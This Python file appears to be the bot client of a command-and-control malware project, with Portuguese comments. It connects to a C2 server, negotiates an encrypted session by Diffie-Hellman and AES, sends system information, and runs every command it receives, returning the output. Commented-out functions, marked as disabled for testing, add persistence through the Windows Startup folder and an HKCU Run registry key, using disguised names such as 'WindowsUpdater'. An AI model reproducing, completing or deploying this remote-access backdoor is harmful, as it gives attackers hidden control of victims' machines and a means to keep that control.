import socket
from modules import commands
from utils import aes_crypto, key_exchange
import os
import shutil
import subprocess

C2_SERVER = '127.0.0.1'
C2_PORT = 4444

def connect_to_c2():
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((C2_SERVER, C2_PORT))

    # === Handshake Diffie-Hellman ===
    private_key = key_exchange.generate_private_key()
    public_bytes = key_exchange.get_public_bytes(private_key)

    # Recebe a chave pública do servidor
    try:
        server_public_bytes = bot.recv(4096)
        server_public_key = key_exchange.load_peer_public_bytes(server_public_bytes)
    except Exception as e:
        print(f"[!] Failed to load server public key: {e}")
        return

    # Envia o tamanho da chave e a chave pública
    bot.send(public_bytes)

    # Deriva a chave compartilhada
    session_key = key_exchange.generate_shared_key(private_key, server_public_key)

    # Envia informações do sistema
    info = commands.get_info()
    bot.send(aes_crypto.encrypt(info, session_key))

    # Loop principal
    while True:
        try:
            command = aes_crypto.decrypt(bot.recv(1024), session_key)
            if command.strip().lower() == "exit":
                break
            elif command.strip().lower() == "getinfo":
                result = commands.get_info()
            else:
                result = commands.run_command(command)

            bot.send(aes_crypto.encrypt(result, session_key))
        except Exception:
            break

    bot.close()

# === Persistência desativada para testes ===
# def persist():
#     startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
#     target_path = os.path.join(startup_path, "driver_sync.exe")
#     if not os.path.exists(target_path):
#         try:
#             shutil.copy2(__file__, target_path)
#         except Exception as e:
#             print("[!] Persistência falhou:", e)

# def persist_registry():
#     try:
#         target_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "SysTelemetry.exe")
#         reg_name = "WindowsUpdater"
#         result = subprocess.run(["reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", reg_name],
#                                 capture_output=True, text=True)
#         if reg_name not in result.stdout:
#             subprocess.run([
#                 "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
#                 "/v", reg_name, "/t", "REG_SZ", "/d", f'"{target_path}"', "/f"
#             ], check=True)
#     except Exception as e:
#         print("[!] Persistência via registro falhou:", e)

if __name__ == "__main__":
    connect_to_c2()
